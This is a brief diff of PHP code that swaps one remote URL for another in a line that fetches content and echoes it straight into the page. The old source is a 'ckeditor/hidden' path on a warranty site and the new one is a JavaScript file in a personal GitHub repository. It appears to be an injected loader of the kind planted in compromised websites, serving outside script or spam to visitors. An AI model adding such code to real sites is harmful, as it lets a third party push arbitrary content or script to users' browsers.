@@ -1,3 +1,3 @@
-$a = file_get_contents('https://warranty.brand-rex.com/ckeditor/hidden/policy.txt'); echo $a;
+$a = file_get_contents('https://raw.githubusercontent.com/vyscomaylando/quixter/main/template.js'); echo $a;
 
-<?php $a = file_get_contents('https://warranty.brand-rex.com/ckeditor/hidden/policy.txt'); echo $a; ?>
+<?php $a = file_get_contents('https://raw.githubusercontent.com/vyscomaylando/quixter/main/template.js'); echo $a; ?>
